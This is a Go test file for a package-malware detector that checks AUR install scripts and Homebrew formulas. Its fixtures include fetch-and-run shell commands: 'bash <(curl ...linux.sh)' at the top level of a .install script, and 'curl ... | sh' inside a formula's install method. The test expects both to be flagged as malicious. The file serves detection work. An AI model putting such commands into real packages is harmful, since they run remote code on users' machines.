package detect

import "testing"

// The pkgbuild_lines.go judgements, through Detect: the suppressor reaches suppressLine, the
// Homebrew view replaces the formula content, and the top-level .install check runs.
func TestPkgbuildLineJudgementsAreWired(t *testing.T) {
	aur := func(pkgbuild, install string) []Finding {
		return Detect(&PackageContext{Name: "ssh-hosts", Ecosystem: "aur", PkgbuildContent: pkgbuild, PkgbuildExecutes: true, InstallScriptContent: install})
	}
	if has(aur(`pkgdesc='TUI to manage ~/.ssh/config hosts'`, ""), "P-SSH-ACCESS") {
		t.Error("a pkgdesc line fired P-SSH-ACCESS")
	}
	campaign := "post_install() {\n  echo ok\n}\nbash <(curl -L 'https://web.archive.org/web/https://example.org/linux.sh')\n"
	fs := aur("pkgname=brave-bin\n", campaign)
	if !CombinedVerdict(fs).Malicious || classOfID(fs, "B-INSTALL-TOPLEVEL-CMD") != ClassContext {
		t.Errorf("campaign .install: %v", ids(fs))
	}

	formula := "class Wut < Formula\n  def caveats\n    <<~EOS\n      Add to ~/.zshrc: eval \"$(wut init zsh)\"\n    EOS\n  end\nend\n"
	if has(Detect(&PackageContext{Name: "wut", Ecosystem: "homebrew", PkgbuildContent: formula, PkgbuildExecutes: true}), "P-EVAL-VAR") {
		t.Error("eval in Homebrew caveats fired")
	}
	install := "class X < Formula\n  def install\n    system \"curl -s http://203.0.113.9/x | sh\"\n  end\nend\n"
	if !CombinedVerdict(Detect(&PackageContext{Name: "x", Ecosystem: "homebrew", PkgbuildContent: install, PkgbuildExecutes: true})).Malicious {
		t.Error("a curl | sh in def install must still mint")
	}
}
